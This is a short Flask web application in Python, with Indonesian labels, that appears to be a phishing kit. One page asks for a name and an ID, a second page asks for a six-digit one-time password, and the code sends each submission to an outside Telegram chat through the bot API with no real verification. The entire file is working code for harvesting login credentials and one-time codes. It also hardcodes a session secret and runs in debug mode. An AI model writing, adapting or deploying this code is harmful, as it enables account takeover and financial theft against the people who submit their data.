from flask import Flask, render_template, request, redirect, session
import requests
import os

app = Flask(__name__)
app.secret_key = 'j1s34ft43utbu76'

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/')
def halaman1():
    # Halaman 1 hanya tampil gambar full body
    return render_template('halaman1.html')

@app.route("/halaman2", methods=['GET', 'POST'])
def halaman2():
    if request.method == 'POST':
        nama = request.form.get('nama')
        id = request.form.get('id')

        session['nama'] = nama
        session['id'] = id

        teks_awal = (
            "🔔DATA BARU (AWAL):\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"🧾id: {id}"
        )

        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload={'chat_id': TELEGRAM_CHAT_ID, 'text': teks_awal}

        requests.post(url, data=payload)

        return redirect('/halaman3')
    return render_template('halaman2.html')

@app.route("/halaman3", methods=["GET", "POST"])
def halaman3():
    if request.method == 'POST':
        otp = ''.join([
            request.form.get('otp1', ''), request.form.get('otp2', ''), request.form.get('otp3', ''), request.form.get('otp4', ''), request.form.get('otp5', ''), request.form.get('otp6', '')
        ])

        nama = session.get('nama')
        id = session.get('id')

        caption = (
            "🔔DATA BARU (AKHIR):\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"🧾id: {id}\n"
            f"🗝otp: {otp}"
        )

        requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption}
            )

        return render_template('halaman3.html', sukses=True)
    return render_template('halaman3.html')

if __name__ == '__main__':
    app.run(debug=True)
